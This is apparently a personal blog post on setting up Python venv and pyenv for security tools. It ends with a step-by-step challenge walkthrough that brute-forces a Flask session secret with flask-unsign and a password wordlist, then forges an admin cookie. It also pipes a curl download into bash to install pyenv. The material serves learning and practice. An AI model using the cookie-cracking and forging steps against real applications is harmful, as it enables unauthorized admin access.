---
title: "Python Virtual Environment  Stop Polluting Your System"
date: 2026-05-25 00:00:00 +0000
categories: [Pyton Virtual Env Setup]
tags: [python, venv, pyenv, tools, setup]
image:
    path: /assets/images/VIRTUAL_ENV/peace.gif
---


I always forget this. Every single time I start a new box or clone a tool from GitHub, I end up Googling the same stuff again. So I'm writing this down  for myself, and for anyone who keeps doing the same thing.

![Virtual Python env](/assets/images/VIRTUAL_ENV/virtual.png)

## Why even bother with venv??

Here's the thing. Python is everywhere in hacking. Most tools, exploits, brute-forcers  they're all written in Python. But the problem is:

- Some tools need **Python 2.7**, which completely breaks with Python 3
- If you just `pip install` everything system-wide, your machine slowly becomes a **mess of conflicting libraries**
- One day it will break. And you won't know why.

The fix is simple: **isolate each tool in its own virtual environment.**


## Method 1 - venv (the simple one)

This is what I use 90% of the time. No extra tools needed.

### Create and activate

```bash
git clone https://github.com/some-tool.git
cd some-tool

python3 -m venv .          # creates the environment inside this folder
source bin/activate        # activate it  your prompt will change
```

Once activated, `pip` and `python` both point to **this folder only**, not your system.

### Install and run

```bash
pip3 install -r requirements.txt    # if requirements file exists
# OR manually:
pip3 install flask requests flask-unsign

python3 exploit.py
```

### Done? Deactivate

```bash
deactivate
```

> **Tip:** When you're completely done with the tool, just delete the folder. No cleanup needed  everything was isolated inside it.


## Method 2 - pyenv (when you need a specific Python version)

Some old exploit tools straight up refuse to run on Python 3. That's where `pyenv` saves you.

### Install pyenv

```bash
curl https://pyenv.run | bash
```

Add this to your `~/.bashrc` or `~/.zshrc`:

```bash
export PYENV_ROOT="$HOME/.pyenv"
export PATH="$PYENV_ROOT/bin:$PATH"
eval "$(pyenv init -)"
```

Then reload:

```bash
source ~/.bashrc
```

### Install whatever Python version you need

```bash
pyenv install 3.6.1
pyenv install 2.7.18      # for really old tools
```

### Create a named environment and use it

```bash
pyenv virtualenv 3.6.1 my-env

cd /path/to/project
pyenv local my-env           # ties this env to this folder
pyenv activate my-env

pyenv exec python3 ./old_script.py

pyenv deactivate
```

> **Tip:** `pyenv versions` shows everything you have. `pyenv global system` switches back to your normal Python.


## Real example - Flask Unsecure Cookie Challenge

This is literally what I did today while solving a Flask cookie challenge. The goal was to brute-force the secret key used to sign the session cookie, then forge an admin cookie.

### Setup

```bash
mkdir flask-challenge && cd flask-challenge
python3 -m venv .
source bin/activate
pip install flask-unsign
```

### Step 1 - Decode the cookie first

Always decode it first to understand what's inside:

```bash
flask-unsign --decode --cookie 'eyJhZG1pbiI6IGZhbHNlLCAidXNlcm5hbWUiOiAiZ3Vlc3QifQ.Z2...'
```

Output:

```
{'admin': 'false', 'username': 'guest'}
```

So the app sets `admin: false` for guest users. The goal is to flip that to `true`. But first we need the **secret key** used to sign the cookie.

### Step 2 - Brute-force the secret key

```bash
flask-unsign \
  --wordlist /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt \
  --unsign \
  --cookie 'eyJhZG1pbiI6IGZhbHNlLCAidXNlcm5hbWUiOiAiZ3Vlc3QifQ.Z2...' \
  --no-literal-eval
```

It'll try millions of passwords from rockyou.txt against the cookie signature. When it finds a match  that's the secret.

> If rockyou.txt doesn't find it (happened to me today lol), try these:
> ```bash
> # JWT/web-specific secrets wordlist
> flask-unsign --wordlist /usr/share/seclists/Passwords/scraped-JWT-secrets.txt ...
>
> # Or try common dev secrets manually
> for secret in 'secret' 'supersecret' 'flask' 'dev' 'secretkey' 'you-will-never-guess' 'changeme'; do
>   flask-unsign --unsign --cookie 'YOUR_COOKIE' --secret "$secret" && echo "FOUND: $secret" && break
> done
> ```

### Step 3 - Forge the admin cookie

Once you have the secret key (let's say it's `supersecret`):

```bash
flask-unsign --sign \
  --cookie "{'admin': 'true', 'username': 'admin'}" \
  --secret 'supersecret'
```

This gives you a brand new signed cookie  but now with `admin: true`. Paste it into your browser's session cookie and refresh. You're in.

### Clean up

```bash
deactivate
```


## Cheatsheet

| What | Command |
|------|---------|
| Create venv | `python3 -m venv .` |
| Activate | `source bin/activate` |
| Deactivate | `deactivate` |
| Install packages | `pip3 install <package>` |
| Install pyenv | `curl https://pyenv.run \| bash` |
| Install Python version | `pyenv install 3.6.1` |
| Create pyenv env | `pyenv virtualenv 3.6.1 myenv` |
| Activate pyenv env | `pyenv activate myenv` |
| List all versions | `pyenv versions` |
| Back to system Python | `pyenv global system` |


Use **venv** for most things. Use **pyenv** when a tool demands a specific Python version. Never install hacking tools system-wide. And write things down  future you will thank you.
